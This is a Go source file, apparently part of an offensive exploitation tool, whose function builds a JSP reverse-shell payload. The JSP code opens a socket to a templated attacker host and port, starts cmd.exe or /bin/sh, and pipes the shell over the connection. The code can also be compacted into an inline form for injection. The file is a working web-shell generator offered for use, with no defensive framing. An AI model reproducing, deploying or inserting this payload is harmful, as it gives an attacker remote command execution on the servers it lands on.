package shellcode

type JavaShellCode struct {
    *ShellCodeBase
}

func NewJavaShellCode() *JavaShellCode {
    return &JavaShellCode{}
}

func (jsc *JavaShellCode) GetJSP(inline bool) string {
    javaCode := `
    <%@page import="java.lang.*, java.util.*, java.io.*, java.net.*"%>
            <%class StreamConnector extends Thread {
                InputStream is;
                OutputStream os;
                StreamConnector( InputStream is, OutputStream os ) {
                    this.is = is;
                    this.os = os;
                }
                public void run() {
                    BufferedReader in = null;
                    BufferedWriter out = null;
                    try {
                        in = new BufferedReader( new InputStreamReader( this.is ) );
                        out = new BufferedWriter( new OutputStreamWriter( this.os ) );
                        char buffer[] = new char[8192];
                        int length;
                        while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 ) {
                            out.write( buffer, 0, length ); out.flush();
                        }
                    } catch( Exception e ){
                    }
                    try {
                        if( in != null ) in.close();
                        if( out != null ) out.close();
                    } catch( Exception e ){}
                }
            }
            try {
                String OS = System.getProperty("os.name").toLowerCase();
                Socket socket = new Socket( "{{LOCALHOST}}", {{LOCALPORT}} );
                String command = "cmd.exe";
                if (OS.indexOf("win") < 0)
                    command = "/bin/sh";
                Process process = Runtime.getRuntime().exec(command);
                (new StreamConnector(process.getInputStream(),socket.getOutputStream())).start();
                (new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();
            } catch( Exception e ) {
            }
            %>
    `
    javaCode = jsc.GenShellCode(javaCode)
    if inline {
        javaCode = jsc.MakeInline(javaCode)
    }

    return javaCode
}

func (jsc *JavaShellCode) GetShellCode() {}

